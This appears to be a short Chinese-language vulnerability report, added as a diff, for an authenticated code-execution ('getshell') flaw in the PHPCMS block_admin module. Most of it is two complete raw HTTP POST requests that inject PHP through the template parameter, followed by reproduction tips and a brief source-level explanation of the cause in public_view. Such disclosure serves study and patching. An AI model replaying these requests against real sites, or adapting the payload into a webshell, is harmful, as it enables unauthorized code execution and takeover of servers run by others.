@@ -1,0 +1,45 @@
+后台发送两个POST请求，即可getshell。
+
+第一个POST请求
+
+POST /phpcms/index.php?m=block&c=block_admin&a=add&pos=2&id=2 HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 75
+Cache-Control: max-age=0
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://127.0.0.1/phpcms/index.ph ... sh=REHvhC&pos=2
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8
+Cookie: zAWyw_admin_username=4ebcTXmxUVn5mCe6SHdtpsNIP_nj8I5ZaJGEaS5KmmcwsZWY; zAWyw_siteid=3ad9wdbZYPHkLdFyIIAUtJt6R6wevEXBnZa8X4Up; zAWyw_userid=3aealgUiWoXSrnmlVyXQl7cQ-5dqjKkBR_oVzTMN; zAWyw_admin_email=2f81CAs2JQ_7vR78a0rpb2DBFu0uMOObd6t7JvIHdBa3zCQaj4IxPwsUQg; zAWyw_sys_lang=5ab0J3Xv00a8twTYrQGHMel9qSZK-i2W1an3Ro7YW3iUFA; zAWyw_att_json=0e9dcazNiDgdiHyherkIWDNZF0ReHgihtLZJibfs8_Tad8gmGuhXZ395nV1ZgFEmCHIQU2jUVimcD8nMXAaKI8EgQ3h0Ckrguy0c3VhRNZO2XWR7WLVH2UED1nzkfbW2vC1myJekiM0akyXlCXLEaQsZ4mX_EOMPv362KXWBk8uiESrYcBOEaRYwMT-c; PHPSESSID=qvito6jbgbcurlchaqjg6klfl2
+Connection: close
+name=122&type=2&dosubmit=&pc_hash=REHvhC&id=2&template=<?php%20phpinfo();?>
+2.发送第二个POST请求，即可执行php代码。这里执行phpinfo为例。
+
+POST /phpcms/index.php?m=block&c=block_admin&a=public_view&pos=2&id=4 HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 70
+Cache-Control: max-age=0
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://127.0.0.1/phpcms/index.ph ... sh=REHvhC&pos=2
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8
+Cookie: zAWyw_admin_username=4ebcTXmxUVn5mCe6SHdtpsNIP_nj8I5ZaJGEaS5KmmcwsZWY; zAWyw_siteid=3ad9wdbZYPHkLdFyIIAUtJt6R6wevEXBnZa8X4Up; zAWyw_userid=3aealgUiWoXSrnmlVyXQl7cQ-5dqjKkBR_oVzTMN; zAWyw_admin_email=2f81CAs2JQ_7vR78a0rpb2DBFu0uMOObd6t7JvIHdBa3zCQaj4IxPwsUQg; zAWyw_sys_lang=5ab0J3Xv00a8twTYrQGHMel9qSZK-i2W1an3Ro7YW3iUFA; zAWyw_att_json=0e9dcazNiDgdiHyherkIWDNZF0ReHgihtLZJibfs8_Tad8gmGuhXZ395nV1ZgFEmCHIQU2jUVimcD8nMXAaKI8EgQ3h0Ckrguy0c3VhRNZO2XWR7WLVH2UED1nzkfbW2vC1myJekiM0akyXlCXLEaQsZ4mX_EOMPv362KXWBk8uiESrYcBOEaRYwMT-c; PHPSESSID=qvito6jbgbcurlchaqjg6klfl2
+Connection: close
+name=122&type=2&dosubmit=&pc_hash=REHvhC&template=<?php%20phpinfo();?>
+其中的id参数需要是第一步操作中id值，pc_hash在复现时也需要改成审核人员自己的。
+
+响应中就有phpinfo信息。
+https://forum.90sec.org/forum.php?mod=attachment&aid=MjMzMDB8ODUzZDMzNDN8MTQ5MTgwNTYzNnwzMTkxfA%3D%3D
+
+查看源码，可以看到漏洞成因。
+phpcms/modules/block/block_admin.php文件中的public_view函数第265行起，写入了一个php文件，并且包含了它。
+
+https://forum.90sec.org/forum.php?mod=attachment&aid=MjMyOTl8NWI3ZjA5YmJ8MTQ5MTgwNTYzNnwzMTkxfA%3D%3D
